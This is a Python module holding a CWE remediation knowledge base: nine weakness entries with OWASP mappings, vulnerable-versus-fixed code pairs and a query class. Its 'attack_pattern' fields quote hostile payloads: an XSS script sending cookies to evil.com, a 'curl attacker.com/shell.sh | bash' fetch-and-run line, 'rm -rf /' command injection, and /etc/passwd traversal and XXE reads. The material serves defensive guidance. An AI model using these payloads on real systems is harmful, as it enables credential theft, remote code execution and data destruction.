"""
CWE Knowledge Base
Maps CWE IDs to structured remediation guidance, attack patterns, and fix examples.
Used to enrich vulnerability findings with authoritative guidance.
"""

from typing import Dict, Any, Optional


CWE_KNOWLEDGE_BASE: Dict[str, Dict[str, Any]] = {
    "CWE-89": {
        "name": "SQL Injection",
        "owasp": "A03:2021 – Injection",
        "description": "The software constructs all or part of an SQL command using externally-influenced input, allowing an attacker to modify the intended SQL command.",
        "severity_guidance": "CRITICAL",
        "attack_pattern": "Attacker injects ' OR '1'='1 or UNION SELECT to exfiltrate data, bypass auth, or destroy data.",
        "fix_strategy": "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
        "fix_example": {
            "python": {
                "vulnerable": "cursor.execute(\"SELECT * FROM users WHERE name='\" + name + \"'\")",
                "fixed": "cursor.execute(\"SELECT * FROM users WHERE name=?\", (name,))"
            },
            "java": {
                "vulnerable": "stmt.execute(\"SELECT * FROM users WHERE name='\" + name + \"'\")",
                "fixed": "PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE name=?\"); ps.setString(1, name);"
            }
        },
        "references": [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        ]
    },
    "CWE-79": {
        "name": "Cross-Site Scripting (XSS)",
        "owasp": "A03:2021 – Injection",
        "description": "The software does not neutralize or incorrectly neutralizes user-controllable input before placing it in output that is used as a webpage.",
        "severity_guidance": "HIGH",
        "attack_pattern": "Attacker injects <script>document.location='http://evil.com?c='+document.cookie</script>",
        "fix_strategy": "Use context-aware output encoding. In Python use markupsafe.escape(), in JS use textContent instead of innerHTML.",
        "fix_example": {
            "python": {
                "vulnerable": "return f'<h1>Hello {name}</h1>'",
                "fixed": "from markupsafe import escape\nreturn f'<h1>Hello {escape(name)}</h1>'"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        ]
    },
    "CWE-78": {
        "name": "OS Command Injection",
        "owasp": "A03:2021 – Injection",
        "description": "The software constructs all or part of an OS command using externally-influenced input.",
        "severity_guidance": "CRITICAL",
        "attack_pattern": "Attacker provides 'filename; rm -rf /' or '`curl attacker.com/shell.sh | bash`'",
        "fix_strategy": "Use subprocess with list arguments (no shell=True). Validate and whitelist allowed values.",
        "fix_example": {
            "python": {
                "vulnerable": "os.system('ls ' + user_input)",
                "fixed": "subprocess.run(['ls', user_input], check=True, capture_output=True)"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
        ]
    },
    "CWE-22": {
        "name": "Path Traversal",
        "owasp": "A01:2021 – Broken Access Control",
        "description": "The software uses external input to construct a pathname intended to identify a file, but does not properly neutralize sequences such as '../'.",
        "severity_guidance": "HIGH",
        "attack_pattern": "Attacker provides '../../etc/passwd' or '%2e%2e%2f' to access files outside intended directory.",
        "fix_strategy": "Use Path.resolve() to canonicalize paths. Verify the resolved path starts with expected base directory.",
        "fix_example": {
            "python": {
                "vulnerable": "open('/data/' + filename).read()",
                "fixed": "base = Path('/data').resolve()\ntarget = (base / filename).resolve()\nif not str(target).startswith(str(base)):\n    raise ValueError('Path traversal detected')\nopen(target).read()"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
        ]
    },
    "CWE-798": {
        "name": "Hardcoded Credentials",
        "owasp": "A07:2021 – Identification and Authentication Failures",
        "description": "The software contains hard-coded credentials, such as a password or cryptographic key.",
        "severity_guidance": "CRITICAL",
        "attack_pattern": "Attacker finds credentials in source code or binary, uses them for unauthorized access.",
        "fix_strategy": "Use environment variables or secret managers (Vault, AWS Secrets Manager, .env files). Never commit credentials.",
        "fix_example": {
            "python": {
                "vulnerable": "API_KEY = 'sk-abc123'",
                "fixed": "import os\nAPI_KEY = os.environ['API_KEY']  # Set in .env or secret manager"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"
        ]
    },
    "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "owasp": "A08:2021 – Software and Data Integrity Failures",
        "description": "The application deserializes untrusted data without sufficiently verifying the data is valid.",
        "severity_guidance": "CRITICAL",
        "attack_pattern": "Attacker crafts malicious pickle/Java serialized object that executes code on deserialization.",
        "fix_strategy": "Avoid pickle/marshal for untrusted data. Use JSON/protobuf. If must deserialize, use signed/verified data only.",
        "fix_example": {
            "python": {
                "vulnerable": "data = pickle.loads(user_data)",
                "fixed": "import json\ndata = json.loads(user_data)  # or use safe alternatives"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
        ]
    },
    "CWE-327": {
        "name": "Use of Broken or Risky Cryptographic Algorithm",
        "owasp": "A02:2021 – Cryptographic Failures",
        "description": "Use of outdated or weak cryptographic algorithms (MD5, SHA1, DES, RC4).",
        "severity_guidance": "HIGH",
        "attack_pattern": "MD5/SHA1 collisions can forge hashes. DES can be brute-forced in hours.",
        "fix_strategy": "Use SHA-256 or better for hashing. AES-256-GCM for encryption. bcrypt/argon2 for passwords.",
        "fix_example": {
            "python": {
                "vulnerable": "hashlib.md5(password.encode()).hexdigest()",
                "fixed": "import bcrypt\nbcrypt.hashpw(password.encode(), bcrypt.gensalt())"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html"
        ]
    },
    "CWE-611": {
        "name": "XXE - XML External Entity Injection",
        "owasp": "A05:2021 – Security Misconfiguration",
        "description": "The software processes XML input with external entity references, allowing attackers to read local files or SSRF.",
        "severity_guidance": "HIGH",
        "attack_pattern": "Attacker injects <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> to read files.",
        "fix_strategy": "Disable external entity processing in XML parsers.",
        "fix_example": {
            "python": {
                "vulnerable": "ET.fromstring(xml_data)",
                "fixed": "from defusedxml import ElementTree as ET\nET.fromstring(xml_data)"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
        ]
    },
    "CWE-918": {
        "name": "SSRF - Server-Side Request Forgery",
        "owasp": "A10:2021 – Server-Side Request Forgery",
        "description": "The server makes HTTP requests to an attacker-specified URL, potentially accessing internal services.",
        "severity_guidance": "HIGH",
        "attack_pattern": "Attacker provides http://169.254.169.254/latest/meta-data/ (AWS metadata) or http://internal-service/admin",
        "fix_strategy": "Validate and whitelist allowed URLs/IPs. Block private IP ranges. Use allowlist of trusted domains.",
        "fix_example": {
            "python": {
                "vulnerable": "requests.get(user_url)",
                "fixed": "from urllib.parse import urlparse\nallowed = ['api.example.com']\nif urlparse(user_url).hostname not in allowed:\n    raise ValueError('URL not allowed')\nrequests.get(user_url)"
            }
        },
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
        ]
    },
}


class CWEKnowledgeBase:
    """Query the CWE knowledge base for remediation guidance."""

    def __init__(self):
        self.db = CWE_KNOWLEDGE_BASE

    def get(self, cwe_id: str) -> Optional[Dict[str, Any]]:
        """Get knowledge base entry for a CWE ID."""
        if not cwe_id:
            return None
        # Normalize: "CWE-89", "89", "cwe-89" all work
        normalized = f"CWE-{cwe_id.upper().replace('CWE-', '').strip()}"
        return self.db.get(normalized)

    def get_fix_example(self, cwe_id: str, language: str = "python") -> Optional[Dict[str, str]]:
        """Get fix example for CWE + language."""
        entry = self.get(cwe_id)
        if entry:
            return entry.get("fix_example", {}).get(language)
        return None

    def get_owasp_category(self, cwe_id: str) -> str:
        """Get OWASP category for CWE."""
        entry = self.get(cwe_id)
        return entry.get("owasp", "") if entry else ""

    def get_all_ids(self) -> list:
        """Return all CWE IDs in the knowledge base."""
        return list(self.db.keys())

    def search(self, keyword: str) -> list:
        """Search knowledge base by keyword."""
        kw = keyword.lower()
        return [
            {"id": cwe_id, **entry}
            for cwe_id, entry in self.db.items()
            if kw in entry["name"].lower() or kw in entry["description"].lower()
        ]
